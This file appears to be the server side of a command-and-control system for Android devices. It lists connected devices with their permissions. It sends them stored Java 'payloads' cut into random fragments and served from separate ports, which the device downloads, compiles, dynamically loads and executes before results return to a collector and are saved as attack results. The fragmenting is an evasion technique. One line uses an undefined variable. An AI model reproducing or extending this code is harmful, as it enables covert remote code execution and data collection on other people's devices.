const payloads = require('../database/models/payload');
const attacks = require('../database/models/attackResult');
const socketManager = require('./socketManager');
const secrets = require('../secrets.json');


const HOSTNAME = process.env.HOSTNAME || secrets.serverHostName || "localhost";


async function showAllDevices() {
    return new Promise((resolve, reject) => {
        const socketsMap = socketManager.getDeviceConnectedToSocketMain();
        let devices = [];

        socketsMap.forEach((socketInfo, port) => {
            devices.push({
                ip: socketInfo.socket.remoteAddress,
                port: port,
                model: socketInfo.model,
                api : socketInfo.api,
                permissions : socketInfo.permissions,
                permissionsGranted : socketInfo.permissionsGranted
            });
        });

        resolve(devices);
    });
}
async function triggerDevice(device, payload_id) {
    return new Promise((resolve, reject) => {
        const sourcePort = device.port;

        payloads.readOneById(payload_id)
            .then( (payload) => {
                const javaCode = payload.content;
                const javaCodeMinified = minifyJavaCode(javaCode);
                const javaPieces = splitJavaCode(javaCodeMinified);
                console.log(javaPieces);

                const randomCodeSenderPorts = socketManager.requireFreeCodeSenderPorts(javaPieces.length);
                console.log(randomCodeSenderPorts);

                //build send string with hostnames and ports
                let serversListStringed = "Servers: ";
                for (let i = 0; i < javaPieces.length; i++) {
                    serversListStringed += HOSTNAME + ":" + randomCodeSenderPorts[i] + "|";
                    socketManager.openNewSocketCodeSender(randomCodeSenderPorts[i], javaPieces[i]);
                }

                const randomPortCollector = socketManager.requireFreeCollectorPort();

                socketManager.writeOnSocketMainByPort(sourcePort, serversListStringed)
                socketManager.writeOnSocketMainByPort(sourcePort, 'Collector: ' + HOSTNAME + ':' + randomPortCollector);
                socketManager.writeOnSocketMainByPort(sourcePort, 'Result Type: ' +  payload.resultType);

                socketManager.openSocketCollectorAndWaitForResult(randomPortCollector)
                    .then((result) => {
                        const tIndex = result.toString().indexOf("Timing: ");
                        const timingString = result.toString().substring(tIndex+8, resultIndex);
                        const timings = timingString.split('~');

                        const rIndex = result.toString().indexOf("|");
                        const resultString = result.toString().substring(rIndex+9);

                        const newAttack = {
                            device : device,
                            payload_id : payload_id,
                            result : resultString,
                            timing: {
                                download_time : parseFloat(timings[0]),
                                parse_time : parseFloat(timings[1]),
                                compile_time : parseFloat(timings[2]),
                                dynamic_loading_time : parseFloat(timings[3]),
                                execution_time : parseFloat(timings[4])
                            },
                            resultType: payload.resultType
                        };
                        console.log(newAttack)


                        attacks.create(newAttack);
                        resolve(newAttack);
                    })
                    .catch((error) => {
                        reject({status: 501, message: error});
                    })
                    .finally(() => {
                        socketManager.releaseCollectorPort(randomPortCollector);
                        socketManager.releaseCodeSenderPorts(randomCodeSenderPorts);
                    });
            })
            .catch((error) => {
                console.log(error);
                reject({status: 404, message: 'payload not found'})
            });
    });
}

/**
 * Returns javaCode minified, removing tabs and spaces
 * @param javaCode to minify
 * @returns {string} javaCode minified
 */
function minifyJavaCode(javaCode){
    const stringEscaped = javaCode.toString().replace(/(\r\n|\n|\r|\t)/gm, '');
    return stringEscaped.replace(/ +(?= )/g, '');
}

/**
 * Returns a random subset split of the javaCode
 * @param javaCode to split
 * @returns {[]}
 */
function splitJavaCode(javaCode) {
    const stringLength = javaCode.length - 1;
    let javaPieces = [];

    let i = 0;
    while(i <= stringLength) {
        const newIndex = i+getRandomInteger(1, stringLength/6);
        const substringLenght = newIndex - i  + 1;
        javaPieces.push(javaCode.substr(i, substringLenght));
        i = newIndex + 1;
    }

    return javaPieces;
}

/**
 * Returns a random integer in range [min;max)
 * @param min inclusive
 * @param max exclusive
 * @returns {number} random integer in range [min;max)
 */
function getRandomInteger(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min)) + min;
}


module.exports = {
    showAllDevices,
    triggerDevice
};
